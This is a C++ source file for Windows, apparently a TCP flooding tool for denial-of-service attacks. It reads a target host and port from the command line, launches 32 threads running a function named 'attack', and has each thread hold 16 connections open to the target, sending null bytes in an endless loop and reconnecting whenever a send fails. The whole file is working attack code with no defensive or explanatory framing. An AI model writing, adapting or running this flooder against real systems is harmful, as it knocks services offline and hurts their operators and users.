#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include "easystrlib.h"

#pragma comment (lib, "Ws2_32.lib")

struct threadinfo
{
	DWORD threadid;
	HANDLE handle;
	char* host;
	int port;
	int id;
};

WSAData wsaData;
size_t sent;
std::vector<threadinfo*> threads;

int initwinsock()
{
	int res = WSAStartup(MAKEWORD(2, 2), &wsaData);
	return res;
}

SOCKET createsocket(char* host, int port)
{
	int err;
	SOCKET sock;

	struct sockaddr_in saddr;

	inet_pton(AF_INET, host, &saddr.sin_addr);
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	err = connect(sock, (sockaddr*)&saddr, sizeof(saddr));
	if (err != -1) printf("Connected to %s:%d\n", host, port);
	else
	{
		printf("No connection could be made\n");
		return 0;
	}

	return sock;
}

#define CONNECTIONS 16
#define THREADS 32

DWORD WINAPI attack(LPVOID lpParameter)
{
	SOCKET sockets[CONNECTIONS];
	int res = 0;
	
	char* buf = (char*)"\0\0\0\0";
	//char buf = '\0\0\0\0';

	struct threadinfo* info;
	info = (struct threadinfo*)lpParameter;

	char* host = info->host;
	int port = info->port;
	int id = info->id;

	for (int i = 0; i < CONNECTIONS; i++) sockets[i] = 0;

	while (true)
	{
		for (int i = 0; i < CONNECTIONS; i++)
		{
			if (sockets[i] == 0) sockets[i] = createsocket(host, port);			

			res = send(sockets[i], buf, 5, 0);

			if (res == -1)
			{
				closesocket(sockets[i]);
				sockets[i] = createsocket(host, port);
			}
			else sent += 4;
		}

		bool kb = sent / 1000.0 > 1;
		bool mb = sent / 1000000.0 > 1;
		
		if (id > 10)
		{
			if (kb) printf("[THREAD %d] [%d KB] Sent\n", id, (int)round(sent / 1000.0));
			//if (mb) printf("[THREAD %d] [%d MB] Sent\n", id, (int)round(sent / 1000000.0));
		}
		else
		{
			if (kb) printf("[THREAD %d]  [%d KB] Sent\n", id, (int)round(sent / 1000.0));
			//if (mb) printf("[THREAD %d]  [%d MB] Sent\n", id, (int)round(sent / 1000000.0));
		}
	}
}

int main(int argc, char* argv[])
{
	int initerr;

	auto str = split(argv[1], ':')[0];
	char* arghost = (char*)str.c_str();
	int argport = atoi(split(argv[1], ':')[1].c_str());

	initerr = initwinsock();

	for (int i = 0; i < THREADS; i++)
	{
		struct threadinfo* info = (threadinfo*)malloc(sizeof(struct threadinfo));
		threads.push_back(info);

		threads[i]->host = arghost;
		threads[i]->port = argport;
		threads[i]->id = i;

		threads[i]->handle = CreateThread(0, 0, attack, threads[i], 0, &threads[i]->threadid);
		printf("Thread %d started (%d)\n", i + 1, threads[i]->threadid);
	}

	struct threadinfo info;
	info.host = arghost;
	info.port = argport;
	info.id = (int)0x00;
	attack((LPVOID)&info);
}